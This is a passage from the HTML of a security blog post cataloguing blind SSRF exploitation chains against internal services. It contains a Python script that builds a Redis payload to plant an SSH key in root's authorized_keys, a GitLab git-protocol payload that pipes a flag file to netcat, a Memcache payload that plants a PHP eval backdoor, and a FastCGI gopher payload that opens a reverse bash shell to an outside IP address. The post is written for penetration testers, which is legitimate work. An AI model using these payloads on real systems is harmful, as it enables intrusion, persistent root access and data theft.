+sshpublic_key = "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8IOnJUAt5b/5jDwBDYJTDULjzaqBe2KW3KhqlaY58XveKQRBLrG3ZV0ffPnIW5SLdueunb4HoFKDQ/KPXFzyvVjqByj5688THkq1RJkYxGlgFNgMoPN151zpZ+eCBdFZEf/m8yIb3/7Cp+31s6Q/DvIFif6IjmVRfWXhnkjNehYjsp4gIEBiiW/jWId5yrO9+AwAX4xSabbxuUyu02AQz8wp+h8DZS9itA9m7FyJw8gCrKLEnM7PK/ClEBevDPSR+0YvvYtnUxeCosqp9VrjTfo5q0nNg9JAvPMs+EA1ohUct9UyXbTehr1Bdv4IXx9+7Vhf4/qwle8HKali3feIZ root@kali\n\n"
+filename="authorized_keys"
+path="/root/.ssh/"
+passwd=""
+cmd=["flushall",
+     "set 1 {}".format(sshpublic_key.replace(" ","${IFS}")),
+     "config set dir {}".format(path),
+     "config set dbfilename {}".format(filename),
+     "save"
+     ]
+if passwd:
+    cmd.insert(0,"AUTH {}".format(passwd))
+payload=protocol+ip+":"+port+"/_"
+def redis_format(arr):
+    CRLF="\r\n"
+    redis_arr = arr.split(" ")
+    cmd=""
+    cmd+="*"+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
+    cmd+=CRLF
+    return cmd
+
+if __name__=="__main__":
+    for x in cmd:
+        payload += urllib.quote(redis_format(x))
+    print payload
+</code></pre>
+
+<p><strong>RCE on GitLab via Git protocol</strong></p>
+
+<p>Great writeup from Liveoverflow <a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">here</a>.</p>
+
+<p>While this required authenticated access to GitLab to exploit, I am including the payload here as the <code>git</code> protocol may work on the target you are hacking. This payload is for reference.</p>
+
+<pre><code class="language-bash">git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
+</code></pre>
+
+<div id="memcache"></div>
+
+<h2 id="memcache">Memcache</h2>
+
+<p><strong>Commonly bound port: 11211</strong></p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/37815">vBulletin Memcache RCE</a></li>
+  <li><a href="https://www.exploit-db.com/exploits/42392">GitHub Enterprise Memcache RCE</a></li>
+  <li><a href="https://blog.safebuff.com/2016/07/03/SSRF-Tips/#SSRF-memcache-Getshell">Example Gopher payload for Memcache</a></li>
+</ul>
+
+<pre><code class="language-bash">gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
+gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
+</code></pre>
+
+<div id="tomcat"></div>
+
+<h2 id="apache-tomcat">Apache Tomcat</h2>
+
+<p><strong>Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)</strong></p>
+
+<p>Effective against Tomcat 6 only:</p>
+
+<p><a href="https://github.com/pimps/gopher-tomcat-deployer">gopher-tomcat-deployer</a></p>
+
+<p>CTF writeup using this technique:</p>
+
+<p><a href="https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/">From XXE to RCE: Pwn2Win CTF 2018 Writeup</a></p>
+
+<div id="fastcgi"></div>
+
+<h2 id="fastcgi">FastCGI</h2>
+
+<p><strong>Commonly bound ports: 80,443 (SSL)</strong></p>
+
+<p>This was taken from <a href="https://blog.chaitin.cn/gopher-attack-surfaces/">here</a>.</p>
+
+<pre><code class="language-bash">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
+</code></pre>
+
+<hr />
+
+<p><strong>Tools</strong></p>
+
+<div id="gopherus"></div>
+
+<h2 id="gopherus">Gopherus</h2>
+
+<ul>
+  <li><a href="https://github.com/tarunkant/Gopherus">Gopherus - Github</a></li>
+  <li><a href="https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/">Blog post on Gopherus</a></li>
+</ul>
+
+<p>This tool generates Gopher payloads for:</p>
+
+<ul>
+  <li>MySQL</li>
+  <li>PostgreSQL</li>
+  <li>FastCGI</li>
+  <li>Redis</li>
+  <li>Zabbix</li>
+  <li>Memcache</li>
+</ul>
+
+<div id="ssrfproxy"></div>
+
+<h2 id="ssrf-proxy">SSRF Proxy</h2>
+
+<ul>
+  <li><a href="https://github.com/bcoles/ssrf_proxy">SSRF Proxy</a></li>
+</ul>
+
+<p>SSRF Proxy is a multi-threaded HTTP proxy server designed to tunnel client HTTP traffic through HTTP servers vulnerable to Server-Side Request Forgery (SSRF).</p>
+
+<hr />
+
+<p>Credits:</p>
+
+<p>Thank you to the following people that have contributed to this post:</p>
+
+<ul>
+  <li><a href="https://twitter.com/Rhynorater">@Rhynorater - Numerous contributions towards this blog post</a></li>
+  <li><a href="https://twitter.com/nnwakelam">@nnwakelam - Solr Shards SSRF</a></li>
+  <li><a href="https://twitter.com/marcioalm">@marcioalm - Tomcat 6 Gopher RCE</a></li>
+  <li><a href="https://twitter.com/vtnahira">@vtnahira - OpenTSDB RCE</a></li>
+  <li><a href="https://twitter.com/fransrosen">@fransrosen - SSRF canaries concept</a></li>
+  <li><a href="https://twitter.com/@theabrahack">@theabrahack - RCE via Jenkins Groovy</a></li>
+  <li>bike chain logo by Rafael Empinotti from the Noun Project</li>
+</ul>
+
+          
+            <div class="share-links my-4 d-inline-flex align-items-center">
+  <h5 class="muted mr-3 mb-0 d-inline-block override-color">Share this post:</h5>
+
+    
+
+    
+      <a class="fa-social fa-social-twitter" href="https://twitter.com/intent/tweet?text=A+Glossary+of+Blind+SSRF+Chains - @assetnote - &amp;url=https%3A%2F%2Fblog.assetnote.io%2F2021%2F01%2F13%2Fblind-ssrf-chains%2F" rel="nofollow" target="_blank" title="Share on Twitter"></a>
+    
+
+    
+
+    
+      <a class="fa-social fa-social-linkedin" href="http://www.linkedin.com/shareArticle?url=https%3A%2F%2Fblog.assetnote.io%2F2021%2F01%2F13%2Fblind-ssrf-chains%2F&amp;title=A+Glossary+of+Blind+SSRF+Chains" rel="nofollow" target="_blank" title="Share on LinkedIn"></a>
+    
+
+    
+
+    
+
+    
+      <a class="fa-social fa-social-reddit" href="http://reddit.com/submit?url=https%3A%2F%2Fblog.assetnote.io%2F2021%2F01%2F13%2Fblind-ssrf-chains%2F&amp;title=A+Glossary+of+Blind+SSRF+Chains" rel="nofollow" target="_blank" title="Share on Reddit"></a>
+    
+
+    
+
+    
+      <a class="fa-social fa-social-hacker-news" onclick="parent.postMessage('submit','*')" href="https://news.ycombinator.com/submitlink?u=https%3A%2F%2Fblog.assetnote.io%2F2021%2F01%2F13%2Fblind-ssrf-chains%2F&amp;t=A+Glossary+of+Blind+SSRF+Chains" rel="nofollow" target="_blank" title="Share on Hacker News"></a>
+    
+</div>
+
+                  
+        </div>
+                <div class="col-lg-8">
+                  <div class="section-title text-center">
+                    <h3>See Assetnote in action</h3>
+                    <p>Find out how Assetnote can help you lock down your external attack surface.</p>
+                    <p>Use the lead form below, or alternatively contact us via email by clicking <a href="/cdn-cgi/l/email-protection#6516040900162504161600110b0a11004b0c0a5a1610070f000611582d0c4548452c4208450c0b1100170016110001450c0b4524161600110b0a110043070a011c58350d0a0b00452b10080700175f454055242f0a0745310c1109005f45405524260a0815040b1c5f454055242b001d114536110015165f450c004b452100080a4945231017110d001745210a061008000b1104110c0a0b40552427101c0c0b0245261c0609005f4534544a34574a34564a3451">here.</a>
+    </p>
+                </div>
+                    <form action="https://webto.salesforce.com/servlet/servlet.WebToLead?encoding=UTF-8" method="POST" name="leads" id="leads">
+                        <input type=hidden name="oid" value="00D2v0000027QHD">
+                        <input type=hidden name="retURL" value="https://assetnote.io/thank-you.html">
+                        <div class="form-group">
+                            <input type="text" id="name" name="00N2j000000ydfD" onchange="TextCapture(this)" class="form-control" placeholder="Full Name" required>
+                            <input type="hidden" id="first_name" maxlength="40" name="first_name" size="20" type="text" />
+                            <input type="hidden" id="last_name" maxlength="80" name="last_name" size="20" type="text" />
+                        </div>
+                        <div class="form-group">
+                            <input type="email" name="email" id="email" class="form-control" placeholder="Email Address" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" name="phone" id="phone" class="form-control" placeholder="Phone Number" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" name="title" id="title" class="form-control" placeholder="Job Title" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" name="company" id="company" class="form-control" placeholder="Company" required>
+                        </div>
+                        <div class="form-group">
+                            <input type="text" name="00N2j000000ydfI" id="00N2j000000ydfI" class="form-control" placeholder="Why are you interested?" required>
+                        </div>
+                        <div class="form-group">
+                            <button type="submit" class="btn btn-xl btn-block btn-primary">REQUEST A DEMO</button>
+                        </div>
+                    </form>
+                </div>
+            <div class="row justify-content-md-center" id="thank-you-component" style="display:none">
+                <div class="col col-md-5">
+                    <div class="section-title text-center">
+                        <h3>Thank you!</h3>
+                        <p>We will be in touch.</p>
+                    </div>
+                </div>
+            </div>
+
+      <!-- Look the author details up from the site config, or authors if multiple are provided in authors key. -->
+      <!-- Output author details if some exist. -->
+      
+      
+      <div class="my-4" id="blog">
+        <div class="">
+            <div class="row justify-content-center">
+                <div class="col-lg-8">
+      <aside class="post-author">
+                <figure class="post-author-avatar avatar">
+                    <img src="/images/shubham_shah.png" alt="Shubham Shah">
+                </figure>
+                <div class="post-author-bio">
+                  <h3 class="post-author-name"><a href="https://twitter.com/infosec_au">Shubham Shah</a> <a class="fa-social fa-social-linkedin" href="https://www.linkedin.com/in/shubhamshah/" rel="nofollow" target="_blank"></a></h3>
+                    <p class="post-author-about">Shubham Shah is the co-founder and CTO of Assetnote, a platform for continuous security monitoring of your external attack surface. Shubham is a bug bounty hunter in the top 30 hackers on HackerOne and has presented at various industry events including QCon London, Kiwicon, BSides Canberra, 44Con and WAHCKon.</p>
+                </div>
+                <div class="clear"></div>
+              </aside>
+                </div>
+              </div>
+            </div>
+        </div>
+      </div>
+      
+  </div>
+</div>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+  function TextCapture(txtid)
+  {
+      var OriginalValue=document.getElementById("name").value;
+      document.getElementById("first_name").value=OriginalValue.substr(0,OriginalValue.indexOf(' ')); 
+      document.getElementById("last_name").value=OriginalValue.substr(OriginalValue.indexOf(' ')+1);;
+  }
+</script>
+<!--End mc_embed_signup-->
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="section bg-dark-footer mt-4" id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-3"> <img src="/images/global/Color-AN-Logo-Transparent.svg" class="logo-dark" alt="Assetnote Logo" />
+            </div>
+            <!-- // end .col-sm-3 -->
+            <div class="col-sm-2">
+                <ul class="list-unstyled footer-links ml-1">
+                    <li><a href="https://www.assetnote.io/company/about-us">About us</a></li>
+                    <li><a href="https://www.assetnote.io/demo">Contact</a></li>
+                </ul>
+            </div>
+            <!-- // end .col-sm-3 -->
+            <div class="col-sm-2">
+                <ul class="list-unstyled footer-links ml-1">
+                    <li><a href="https://labs.assetnote.io/">Labs</a></li>
+                    <li><a href="https://www.assetnote.io/policies/privacy-policy">Privacy</a></li>
+                </ul>
+            </div>
+            <!-- // end .col-sm-3 -->
+            <div class="col-sm-2">
+                <ul class="list-unstyled footer-links ml-1">
+                    <li><a href="https://twitter.com/assetnote">Twitter</a></li>
+                    <li><a href="https://www.linkedin.com/company/assetnote">Linkedin</a></li>
+                </ul>
+            </div>
+            <!-- // end .col-sm-3 -->
+            <div class="col-sm-2 top-btn-ctr">
+                <a href="#top" class="btn align-middle btn-primary my-2 my-lg-0 mono-font">Go to Top</a>
+            </div>
+            <!-- // end .col-sm-3 -->
+        </div>
+        <!-- // end .row -->
+        <div class=" text-center mt-4 white"> <small class="white">Copyright ©
+                    <script type="text/javascript">
+                    document.write(new Date().getFullYear());
+                    </script>
+                    Assetnote Pty.Ltd.
+                </small></div>
+    </div>
+    <!-- // end .container -->
+</div>
+</body>
+</html>
